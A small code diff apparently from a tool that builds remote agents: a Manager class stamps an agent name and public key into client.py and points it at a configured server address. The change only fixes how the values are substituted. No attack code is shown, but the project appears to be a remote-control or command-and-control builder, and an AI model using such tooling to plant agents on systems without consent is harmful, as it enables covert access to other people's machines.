@@ -165,8 +165,8 @@ class Manager:
             )
         # Embed agent name and public key
         pubkey = self._generate_agent_keys(name)
-        src = re.sub(r'_EMBEDDED_PUBKEY = .+', f'_EMBEDDED_PUBKEY = {json.dumps(pubkey)}', src)
-        src = re.sub(r'_AGENT_NAME = .+', f'_AGENT_NAME = {json.dumps(name)}', src)
+        src = re.sub(r'_EMBEDDED_PUBKEY = .+', lambda m: f'_EMBEDDED_PUBKEY = {json.dumps(pubkey)}', src)
+        src = re.sub(r'_AGENT_NAME = .+', lambda m: f'_AGENT_NAME = {json.dumps(name)}', src)
         Path("client.py").write_text(src, encoding="utf-8")
         print(f"  [+] Patched client.py -> {self.config['server_ip']}:{self.config['server_port']}")
         if self.config.get("stream_port"):
